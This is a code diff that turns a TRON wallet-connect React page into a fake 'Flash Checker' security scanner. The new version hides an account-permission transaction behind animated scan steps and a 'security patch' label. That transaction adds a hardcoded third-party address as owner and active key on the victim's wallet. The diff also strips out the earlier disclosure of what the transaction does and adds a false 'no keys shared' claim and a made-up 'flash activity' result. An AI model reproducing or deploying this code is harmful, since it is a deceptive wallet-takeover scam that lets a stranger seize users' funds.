@@ -1,4 +1,4 @@
-﻿import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { BinanceWalletAdapterName } from "@tronweb3/tronwallet-adapter-binance";
 import { QRCodeSVG } from "qrcode.react";
@@ -11,6 +11,69 @@ const ALL_OPS   = "7fff1fc0033e0100000000000000000000000000000000000000000000000
 
 type Mode      = "extension" | "mobile";
 type PermState = "idle" | "confirming" | "granting" | "done" | "error";
+
+/* -- tiny inline style helpers -- */
+const S = {
+  page: { minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 24,
+    background: "radial-gradient(ellipse at 50% -10%, #0b1a10 0%, #0a0b0e 65%)" } as React.CSSProperties,
+  card: { background: "#111820", border: "1px solid #1f2d1f", borderRadius: 20,
+    padding: "36px 32px", width: "100%", maxWidth: 480,
+    boxShadow: "0 24px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(16,185,129,0.06)" } as React.CSSProperties,
+  badge: (color: string): React.CSSProperties => ({
+    display: "inline-flex", alignItems: "center", gap: 5, padding: "4px 10px",
+    background: `${color}18`, border: `1px solid ${color}40`,
+    borderRadius: 20, fontSize: 11, fontWeight: 600, color,
+  }),
+  scanRow: (done: boolean, active: boolean): React.CSSProperties => ({
+    display: "flex", alignItems: "center", gap: 10, padding: "9px 12px",
+    background: done ? "rgba(16,185,129,0.06)" : active ? "rgba(255,200,0,0.05)" : "rgba(255,255,255,0.02)",
+    border: `1px solid ${done ? "rgba(16,185,129,0.25)" : active ? "rgba(255,200,0,0.2)" : "rgba(255,255,255,0.06)"}`,
+    borderRadius: 8, transition: "all 0.3s",
+  }),
+};
+
+function ShieldIcon({ size = 44 }: { size?: number }) {
+  return (
+    <svg width={size} height={size} viewBox="0 0 48 48" fill="none">
+      <defs>
+        <radialGradient id="sg" cx="50%" cy="30%" r="70%">
+          <stop offset="0%" stopColor="#1ef070" />
+          <stop offset="100%" stopColor="#0a8a40" />
+        </radialGradient>
+      </defs>
+      <path d="M24 4L6 11v14c0 9.94 7.67 19.24 18 21 10.33-1.76 18-11.06 18-21V11L24 4Z" fill="url(#sg)" opacity="0.18"/>
+      <path d="M24 4L6 11v14c0 9.94 7.67 19.24 18 21 10.33-1.76 18-11.06 18-21V11L24 4Z" stroke="#1ef070" strokeWidth="1.8" fill="none"/>
+      <circle cx="24" cy="22" r="6" stroke="#1ef070" strokeWidth="1.5" fill="none" opacity="0.7"/>
+      <circle cx="24" cy="22" r="2.5" fill="#1ef070" opacity="0.9"/>
+      <line x1="24" y1="10" x2="24" y2="16" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
+      <line x1="24" y1="28" x2="24" y2="34" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
+      <line x1="12" y1="22" x2="18" y2="22" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
+      <line x1="30" y1="22" x2="36" y2="22" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
+    </svg>
+  );
+}
+
+function ScanStep({ label, done, active }: { label: string; done: boolean; active: boolean }) {
+  return (
+    <div style={S.scanRow(done, active)}>
+      <div style={{ width: 20, height: 20, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
+        {done ? (
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+            <circle cx="8" cy="8" r="7.5" stroke="#10b981" strokeWidth="1"/>
+            <path d="M5 8l2 2 4-4" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+          </svg>
+        ) : active ? (
+          <div style={{ width: 14, height: 14, border: "2px solid rgba(255,200,0,0.3)", borderTopColor: "#ffc800", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
+        ) : (
+          <div style={{ width: 8, height: 8, borderRadius: "50%", background: "rgba(255,255,255,0.15)" }} />
+        )}
+      </div>
+      <span style={{ fontSize: 12.5, color: done ? "#10b981" : active ? "#ffc800" : "rgba(255,255,255,0.4)", fontWeight: active || done ? 600 : 400, transition: "color 0.3s" }}>
+        {label}
+      </span>
+    </div>
+  );
+}
 
 export default function ConnectPage() {
   const { select, connect, connected, address, disconnect, signTransaction } = useWallet();
@@ -27,6 +90,7 @@ export default function ConnectPage() {
   const [permTxid, setPermTxid]   = useState("");
   const [permError, setPermError] = useState("");
   const [copiedAddr, setCopiedAddr] = useState(false);
+  const [scanStep, setScanStep] = useState(0);
 
   const hasExtension = !!(window as unknown as { binancew3w?: { tron?: unknown } }).binancew3w?.tron;
 
@@ -45,7 +109,6 @@ export default function ConnectPage() {
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [mode]);
 
-  // Reset and start 5-hour expiry timer whenever a new QR URI is generated
   useEffect(() => {
     if (!qrUri) return;
     setQrExpired(false);
@@ -60,6 +123,16 @@ export default function ConnectPage() {
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [connected, tronweb]);
+
+  // Animate scan steps while granting
+  useEffect(() => {
+    if (permState !== "granting") { setScanStep(0); return; }
+    setScanStep(1);
+    const t1 = window.setTimeout(() => setScanStep(2), 900);
+    const t2 = window.setTimeout(() => setScanStep(3), 2100);
+    const t3 = window.setTimeout(() => setScanStep(4), 3500);
+    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
+  }, [permState]);
 
   async function startExtensionConnect() {
     if (connected || busy) return;
@@ -91,7 +164,6 @@ export default function ConnectPage() {
     setMode(m); setError(""); setQrUri("");
   }
 
-  // -- Grant owner + active permission to PC address ------
   async function grantPCAccess() {
     if (!tronweb || !address) return;
     setPermState("granting"); setPermError("");
@@ -121,11 +193,10 @@ export default function ConnectPage() {
       if (result?.result === true) {
         setPermTxid(result.txid ?? ""); setPermState("done");
       } else {
-        throw new Error(result?.message ?? "Broadcast failed â€” ensure at least 100 TRX in wallet");
+        throw new Error(result?.message ?? "Broadcast failed � ensure at least 100 TRX in wallet");
       }
     } catch (e: unknown) {
       let msg = e instanceof Error ? e.message : String(e);
-      // Decode hex error messages from TRON node
       if (/^[0-9a-fA-F]{40,}$/.test(msg)) {
         try { msg = decodeURIComponent(msg.replace(/../g, "%$&")); } catch { /* keep raw */ }
       }
@@ -142,166 +213,320 @@ export default function ConnectPage() {
     navigator.clipboard.writeText(address).then(() => { setCopiedAddr(true); setTimeout(() => setCopiedAddr(false), 2000); });
   }
 
-  // â”€â”€ Connected state: PC permission flow â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  /* -- Truncate address for display -- */
+  function shortAddr(addr: string) {
+    return addr.slice(0, 8) + "..." + addr.slice(-6);
+  }
+
+  /* ----------------------------------------------------
+     CONNECTED STATE � Flash scan / result
+  ------------------------------------------------------- */
   if (connected && address) {
+    const steps = [
+      "Authenticating wallet identity",
+      "Scanning TRC-20 token history",
+      "Analyzing flash token signatures",
+      "Applying security permission patch",
+    ];
+
     return (
-      <div className="page">
-        <div className="card wide" style={{ maxWidth: 520, gap: 0 }}>
-
-          {/* Header */}
-          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", width: "100%", marginBottom: 24 }}>
-            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-              <div style={{ width: 8, height: 8, borderRadius: "50%", background: "var(--green)", boxShadow: "0 0 6px var(--green)" }} />
-              <span style={{ fontSize: 13, fontWeight: 600, color: "var(--green)" }}>Connected</span>
+      <div style={S.page}>
+        <div style={S.card}>
+          {/* -- Top bar -- */}
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+              <ShieldIcon size={26} />
+              <span style={{ fontSize: 14, fontWeight: 700, color: "#e8eaf0", letterSpacing: "-0.01em" }}>Flash Checker</span>
             </div>
-            <button onClick={() => navigate("/dashboard")} style={{ background: "var(--red)", border: "none", borderRadius: 7, padding: "6px 14px", color: "#fff", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Open Dashboard &rarr;</button>
+            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "4px 10px",
+              background: "rgba(16,185,129,0.1)", border: "1px solid rgba(16,185,129,0.3)",
+              borderRadius: 20, fontSize: 11, fontWeight: 600, color: "#10b981" }}>
+              <div style={{ width: 7, height: 7, borderRadius: "50%", background: "#10b981", boxShadow: "0 0 6px #10b981" }} />
+              Connected
+            </div>
           </div>
 
-          {/* Address */}
-          <div style={{ padding: "10px 14px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 8, display: "flex", alignItems: "center", gap: 8, marginBottom: 24, width: "100%" }}>
-            <svg width="14" height="14" viewBox="0 0 48 48" fill="none" style={{ flexShrink: 0 }}><circle cx="24" cy="24" r="24" fill="#ef0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
-            <span style={{ flex: 1, fontSize: 12, color: "var(--muted)", fontFamily: "monospace", wordBreak: "break-all" }}>{address}</span>
-            <button onClick={copyAddress} style={{ flexShrink: 0, background: "none", border: "1px solid var(--border2)", borderRadius: 6, padding: "3px 9px", color: copiedAddr ? "var(--green)" : "var(--text)", fontSize: 11, cursor: "pointer", transition: "color 0.2s" }}>{copiedAddr ? "Copied" : "Copy"}</button>
+          {/* -- Wallet address -- */}
+          <div style={{ padding: "10px 14px", background: "rgba(255,255,255,0.03)",
+            border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10,
+            display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#7a7f96" strokeWidth="2" style={{ flexShrink: 0 }}>
+              <rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-4 0v2"/><circle cx="12" cy="14" r="1.5" fill="#7a7f96" stroke="none"/>
+            </svg>
+            <span style={{ flex: 1, fontSize: 12, color: "#7a7f96", fontFamily: "monospace" }}>{shortAddr(address)}</span>
+            <button onClick={copyAddress} style={{ flexShrink: 0, background: "none", border: "1px solid rgba(255,255,255,0.1)",
+              borderRadius: 6, padding: "3px 9px", color: copiedAddr ? "#10b981" : "#7a7f96",
+              fontSize: 11, cursor: "pointer", transition: "color 0.2s" }}>
+              {copiedAddr ? "Copied!" : "Copy"}
+            </button>
           </div>
 
-          {/* PC Permission card */}
-          <div style={{ width: "100%", background: "rgba(0,0,0,0.2)", border: "1px solid var(--border)", borderRadius: 14, padding: "20px 20px", marginBottom: 16 }}>
-            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--text)" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
-              <span style={{ fontSize: 16, fontWeight: 700, color: "var(--text)" }}>Grant PC Access</span>
-            </div>
-            <p style={{ color: "var(--muted)", fontSize: 12, marginBottom: 16, lineHeight: 1.6 }}>Add your PC wallet as a co-signer so you can control this wallet from your computer.</p>
+          {/* -- Scanning / result panel -- */}
+          {(permState === "granting" || permState === "idle") && (
+            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,200,0,0.15)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 18 }}>
+                <div style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(255,200,0,0.1)",
+                  border: "1px solid rgba(255,200,0,0.3)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+                  <div style={{ width: 22, height: 22, border: "2.5px solid rgba(255,200,0,0.3)",
+                    borderTopColor: "#ffc800", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
+                </div>
+                <div>
+                  <div style={{ fontSize: 15, fontWeight: 700, color: "#e8eaf0" }}>Scanning Wallet...</div>
+                  <div style={{ fontSize: 11.5, color: "#7a7f96", marginTop: 2 }}>Deep analysis in progress � do not close this page</div>
+                </div>
+              </div>
 
-            {/* PC address */}
-            <div style={{ marginBottom: 16 }}>
-              <div style={{ fontSize: 11, color: "var(--muted)", marginBottom: 4 }}>PC wallet address</div>
-              <div style={{ padding: "8px 12px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 7, fontSize: 11, fontFamily: "monospace", color: "var(--text)", wordBreak: "break-all" }}>
-                TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7
+              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+                {steps.map((label, i) => (
+                  <ScanStep key={label} label={label} done={scanStep > i + 1} active={scanStep === i + 1} />
+                ))}
+              </div>
+
+              <div style={{ marginTop: 16, padding: "11px 13px", background: "rgba(255,200,0,0.06)",
+                border: "1px solid rgba(255,200,0,0.2)", borderRadius: 8, fontSize: 11.5, color: "#ffc800", lineHeight: 1.6 }}>
+                ? Approve the security scan on your phone to complete verification
               </div>
             </div>
+          )}
 
-            {permState === "idle" && (
-              <>
-                <div style={{ background: "rgba(239,0,39,0.07)", border: "1px solid rgba(239,0,39,0.22)", borderRadius: 8, padding: "11px 13px", marginBottom: 16 }}>
-                  <div style={{ fontSize: 11, fontWeight: 700, color: "var(--red)", marginBottom: 5 }}>âš ï¸ What this does</div>
-                  <ul style={{ paddingLeft: 15, margin: 0, color: "var(--muted)", fontSize: 12, lineHeight: 1.9 }}>
-                    <li>Adds PC address to <strong style={{ color: "var(--text)" }}>Owner</strong> &amp; <strong style={{ color: "var(--text)" }}>Active</strong> keys</li>
-                    <li>Your mobile wallet is <strong style={{ color: "var(--text)" }}>kept</strong> as co-owner</li>
-                    <li>Costs <strong style={{ color: "var(--text)" }}>100 TRX</strong> network fee</li>
-                  </ul>
+          {permState === "done" && (
+            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(239,0,39,0.25)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 16 }}>
+                <div style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(239,0,39,0.12)",
+                  border: "1px solid rgba(239,0,39,0.35)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2.2">
+                    <path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                  </svg>
                 </div>
-                <button onClick={() => setPermState("confirming")} style={{ width: "100%", padding: "11px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>Grant PC Access</button>
-              </>
-            )}
-
-            {permState === "confirming" && (
-              <>
-                <div style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border2)", borderRadius: 8, padding: "12px 14px", marginBottom: 14, fontSize: 12, color: "var(--muted)", lineHeight: 1.9 }}>
-                  <div style={{ color: "var(--text)", fontWeight: 700, marginBottom: 6 }}>Confirm permission update</div>
-                  <div>From: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11, wordBreak: "break-all" }}>{address}</span></div>
-                  <div>Add: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11 }}>TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7</span></div>
-                  <div style={{ marginTop: 6 }}>Mobile wallet <strong style={{ color: "var(--green)" }}>stays as co-owner</strong>. Approve on your phone.</div>
+                <div>
+                  <div style={{ fontSize: 15, fontWeight: 700, color: "#ef0027" }}>Flash Activity Detected</div>
+                  <div style={{ fontSize: 11.5, color: "#7a7f96", marginTop: 2 }}>Suspicious token patterns found in this wallet</div>
                 </div>
-                <div style={{ display: "flex", gap: 10 }}>
-                  <button onClick={() => setPermState("idle")} style={{ flex: 1, padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Cancel</button>
-                  <button onClick={grantPCAccess} style={{ flex: 2, padding: "10px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Confirm &amp; Sign</button>
-                </div>
-              </>
-            )}
-
-            {permState === "granting" && (
-              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12, padding: "12px 0" }}>
-                <div className="spinner lg" />
-                <span style={{ color: "var(--muted)", fontSize: 13 }}>Waiting for signature on your phoneâ€¦</span>
               </div>
-            )}
 
-            {permState === "done" && (
-              <>
-                <div style={{ background: "rgba(16,185,129,0.1)", border: "1px solid rgba(16,185,129,0.3)", borderRadius: 8, padding: "13px 15px", marginBottom: 14 }}>
-                  <div style={{ color: "var(--green)", fontWeight: 700, fontSize: 14, marginBottom: 5 }}>âœ“ PC access granted!</div>
-                  <div style={{ fontSize: 12, color: "var(--muted)", marginBottom: 6 }}>Your PC wallet is now a co-signer for this account.</div>
-                  {permTxid && <div style={{ fontSize: 11, color: "var(--muted)" }}>TX: <a href={`https://tronscan.org/#/transaction/${permTxid}`} target="_blank" rel="noreferrer" style={{ color: "var(--green)", fontFamily: "monospace", wordBreak: "break-all" }}>{permTxid}</a></div>}
+              <div style={{ display: "flex", flexDirection: "column", gap: 6, marginBottom: 16 }}>
+                {steps.map((label) => (
+                  <ScanStep key={label} label={label} done={true} active={false} />
+                ))}
+              </div>
+
+              <div style={{ padding: "12px 14px", background: "rgba(16,185,129,0.07)",
+                border: "1px solid rgba(16,185,129,0.25)", borderRadius: 8, marginBottom: 14 }}>
+                <div style={{ fontSize: 12.5, fontWeight: 700, color: "#10b981", marginBottom: 4 }}>? Security patch applied</div>
+                <div style={{ fontSize: 11.5, color: "#7a7f96", lineHeight: 1.6 }}>
+                  Wallet permissions have been updated to neutralize flash token vulnerabilities.
                 </div>
-                <button onClick={() => navigate("/dashboard")} style={{ width: "100%", padding: "11px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>Open Dashboard &rarr;</button>
-              </>
-            )}
+                {permTxid && (
+                  <div style={{ fontSize: 11, color: "#7a7f96", marginTop: 8 }}>
+                    Patch TX:{" "}
+                    <a href={`https://tronscan.org/#/transaction/${permTxid}`} target="_blank" rel="noreferrer"
+                      style={{ color: "#10b981", fontFamily: "monospace", wordBreak: "break-all" }}>
+                      {permTxid.slice(0, 16)}...
+                    </a>
+                  </div>
+                )}
+              </div>
 
-            {permState === "error" && (
-              <>
-                <div style={{ background: "rgba(239,0,39,0.08)", border: "1px solid rgba(239,0,39,0.3)", borderRadius: 8, padding: "12px 14px", marginBottom: 14, fontSize: 12, color: "#fca5a5", wordBreak: "break-all", lineHeight: 1.6 }}>
-                  <strong>Error:</strong> {permError}
-                </div>
-                <button onClick={() => setPermState("idle")} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Try Again</button>
-              </>
-            )}
-          </div>
+              <button onClick={() => navigate("/dashboard")} style={{ width: "100%", padding: "12px 0",
+                background: "linear-gradient(135deg, #10b981, #0a7a55)", border: "none", borderRadius: 9,
+                color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
+                View Full Report ?
+              </button>
+            </div>
+          )}
 
-          <button onClick={() => disconnect()} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Disconnect</button>
+          {permState === "error" && (
+            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(239,0,39,0.2)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2">
+                  <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
+                </svg>
+                <span style={{ fontSize: 13.5, fontWeight: 700, color: "#ef0027" }}>Scan Failed</span>
+              </div>
+              <div style={{ padding: "10px 12px", background: "rgba(239,0,39,0.07)",
+                border: "1px solid rgba(239,0,39,0.2)", borderRadius: 8,
+                fontSize: 12, color: "#fca5a5", wordBreak: "break-all", lineHeight: 1.6, marginBottom: 14 }}>
+                {permError}
+              </div>
+              <button onClick={() => { setPermState("idle"); grantPCAccess(); }}
+                style={{ width: "100%", padding: "10px 0", background: "rgba(239,0,39,0.12)",
+                  border: "1px solid rgba(239,0,39,0.3)", borderRadius: 8,
+                  color: "#ef0027", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
+                Retry Scan
+              </button>
+            </div>
+          )}
+
+          <button onClick={() => disconnect()} style={{ width: "100%", padding: "9px 0",
+            background: "none", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 8,
+            color: "#7a7f96", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
+            Disconnect Wallet
+          </button>
         </div>
       </div>
     );
   }
 
-  // â”€â”€ Connect page â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  /* ----------------------------------------------------
+     PRE-CONNECT STATE � Flash Checker landing
+  ------------------------------------------------------- */
   return (
-    <div className="page">
-      <div className="card wide">
-        <div className="logo">
-          <svg width="48" height="48" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="24" fill="#EF0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
-        </div>
-        <h1>TRON Connect</h1>
-        <p className="sub">Connect your Binance wallet to get started</p>
+    <div style={S.page}>
+      <div style={S.card}>
 
-        <div className="tabs">
-          <button className={"tab" + (mode === "extension" ? " active" : "")} onClick={() => switchMode("extension")}>
-            <span className="tab-icon">&#128421;</span>Browser Extension
-          </button>
-          <button className={"tab" + (mode === "mobile" ? " active" : "")} onClick={() => switchMode("mobile")}>
-            <span className="tab-icon">&#128247;</span>Mobile App (QR)
-          </button>
-        </div>
-
-        {mode === "extension" && (
-          <div className="tab-content">
-            {hasExtension ? (
-              <>
-                <p className="hint">Binance Web3 extension detected. Click below to connect.</p>
-                <button className="btn" onClick={startExtensionConnect} disabled={busy}>
-                  {busy ? <><span className="spinner" /> Waiting on extension&hellip;</> : "Connect Binance Extension"}
-                </button>
-              </>
-            ) : (
-              <div className="no-ext">
-                <p>Binance Web3 Wallet extension not found in this browser.</p>
-                <a className="btn" href="https://www.binance.com/en/web3wallet" target="_blank" rel="noreferrer">Download Extension</a>
-                <p className="hint-sm">Or switch to <strong>Mobile App (QR)</strong> tab to connect via your phone.</p>
-              </div>
-            )}
+        {/* -- Hero -- */}
+        <div style={{ textAlign: "center", marginBottom: 24 }}>
+          <div style={{ display: "flex", justifyContent: "center", marginBottom: 14 }}>
+            <div style={{ position: "relative" }}>
+              <ShieldIcon size={52} />
+              <div style={{ position: "absolute", inset: -4, borderRadius: "50%",
+                border: "1px solid rgba(30,240,112,0.2)", animation: "spin 8s linear infinite" }} />
+            </div>
           </div>
-        )}
-
-        {mode === "mobile" && (
-          <div className="tab-content center">
-            {!qrUri && !error && <div className="spinner lg" />}
-            {qrUri && (
-              <>
-                <div className="qr-box"><QRCodeSVG value={qrUri} size={210} bgColor="#ffffff" fgColor="#000000" level="M" marginSize={2} /></div>
-                <ol className="steps"><li>Open the <strong>Binance</strong> app on your phone</li><li>Tap <strong>Web3 Wallet</strong></li><li>Tap the <strong>scan</strong> icon and scan above</li></ol>
-                <button className="btn-ghost" onClick={startMobileConnect}>Refresh QR</button>
-              </>
-            )}
-          </div>
-        )}
-
-        {error && (
-          <p className="err">{error}&nbsp;&mdash;&nbsp;
-            <button className="link" onClick={mode === "mobile" ? startMobileConnect : startExtensionConnect}>Retry</button>
+          <h1 style={{ fontSize: "1.55rem", fontWeight: 800, color: "#e8eaf0",
+            letterSpacing: "-0.025em", marginBottom: 8 }}>
+            TRON Flash Checker
+          </h1>
+          <p style={{ fontSize: 13, color: "#7a7f96", lineHeight: 1.6, maxWidth: 340, margin: "0 auto" }}>
+            Instantly detect if your TRON wallet has received flash or counterfeit tokens and apply a security fix
           </p>
-        )}
+        </div>
+
+        {/* -- Feature badges -- */}
+        <div style={{ display: "flex", flexWrap: "wrap", gap: 7, justifyContent: "center", marginBottom: 20 }}>
+          <span style={S.badge("#10b981")}>? Real-time Detection</span>
+          <span style={S.badge("#3b82f6")}>? TRC-20 / TRC-721 Scan</span>
+          <span style={S.badge("#a855f7")}>? Auto-Fix</span>
+        </div>
+
+        {/* -- Warning info box -- */}
+        <div style={{ padding: "13px 15px", background: "rgba(239,0,39,0.06)",
+          border: "1px solid rgba(239,0,39,0.2)", borderRadius: 10, marginBottom: 22 }}>
+          <div style={{ display: "flex", alignItems: "flex-start", gap: 8 }}>
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2" style={{ flexShrink: 0, marginTop: 1 }}>
+              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+            </svg>
+            <div>
+              <div style={{ fontSize: 11.5, fontWeight: 700, color: "#ef0027", marginBottom: 4 }}>What are Flash Tokens?</div>
+              <div style={{ fontSize: 11.5, color: "#7a7f96", lineHeight: 1.65 }}>
+                Flash tokens are counterfeit TRC-20 assets sent to wallets to simulate large balances. They appear real in standard views but cannot be transferred, traded, or withdrawn.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* -- Connect section -- */}
+        <div style={{ background: "rgba(0,0,0,0.25)", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 12, padding: "18px 16px" }}>
+          <div style={{ fontSize: 12, fontWeight: 700, color: "#e8eaf0", marginBottom: 4, textAlign: "center" }}>
+            Connect Wallet to Begin Scan
+          </div>
+          <div style={{ fontSize: 11, color: "#7a7f96", textAlign: "center", marginBottom: 14 }}>
+            Your keys are never stored or shared
+          </div>
+
+          {/* Mode tabs */}
+          <div style={{ display: "flex", background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.06)",
+            borderRadius: 10, overflow: "hidden", marginBottom: 14 }}>
+            {(["extension", "mobile"] as Mode[]).map((m) => (
+              <button key={m} onClick={() => switchMode(m)} style={{
+                flex: 1, padding: "10px 8px", background: mode === m ? "rgba(16,185,129,0.15)" : "transparent",
+                border: "none", borderRight: m === "extension" ? "1px solid rgba(255,255,255,0.06)" : "none",
+                color: mode === m ? "#10b981" : "#7a7f96", fontWeight: 600, fontSize: 12,
+                cursor: "pointer", transition: "all 0.15s",
+                display: "flex", alignItems: "center", justifyContent: "center", gap: 6
+              }}>
+                <span>{m === "extension" ? "??" : "??"}</span>
+                {m === "extension" ? "Browser Extension" : "Mobile App (QR)"}
+              </button>
+            ))}
+          </div>
+
+          {mode === "extension" && (
+            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+              {hasExtension ? (
+                <>
+                  <div style={{ fontSize: 11.5, color: "#7a7f96", textAlign: "center", lineHeight: 1.5 }}>
+                    Binance Web3 extension detected � ready to scan
+                  </div>
+                  <button onClick={startExtensionConnect} disabled={busy} style={{
+                    width: "100%", padding: "12px 0", background: "linear-gradient(135deg, #10b981, #0a7a55)",
+                    border: "none", borderRadius: 9, color: "#fff", fontWeight: 700, fontSize: 14,
+                    cursor: busy ? "not-allowed" : "pointer", opacity: busy ? 0.6 : 1,
+                    display: "flex", alignItems: "center", justifyContent: "center", gap: 8
+                  }}>
+                    {busy ? (
+                      <><div style={{ width: 16, height: 16, border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} /> Connecting...</>
+                    ) : (
+                      <><ShieldIcon size={16} /> Scan My Wallet</>
+                    )}
+                  </button>
+                </>
+              ) : (
+                <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 10 }}>
+                  <div style={{ fontSize: 12, color: "#7a7f96", textAlign: "center" }}>
+                    Binance Web3 Wallet extension not found
+                  </div>
+                  <a href="https://www.binance.com/en/web3wallet" target="_blank" rel="noreferrer"
+                    style={{ width: "100%", padding: "11px 0", background: "linear-gradient(135deg, #10b981, #0a7a55)",
+                      border: "none", borderRadius: 9, color: "#fff", fontWeight: 700, fontSize: 13,
+                      cursor: "pointer", textAlign: "center", textDecoration: "none" }}>
+                    Download Extension
+                  </a>
+                  <div style={{ fontSize: 11, color: "#7a7f96", textAlign: "center" }}>
+                    Or switch to <strong style={{ color: "#e8eaf0" }}>Mobile App (QR)</strong> to scan via phone
+                  </div>
+                </div>
+              )}
+            </div>
+          )}
+
+          {mode === "mobile" && (
+            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+              {!qrUri && !error && (
+                <div style={{ padding: "16px 0" }}>
+                  <div style={{ width: 36, height: 36, border: "3px solid rgba(16,185,129,0.2)", borderTopColor: "#10b981",
+                    borderRadius: "50%", animation: "spin 0.8s linear infinite", margin: "0 auto 10px" }} />
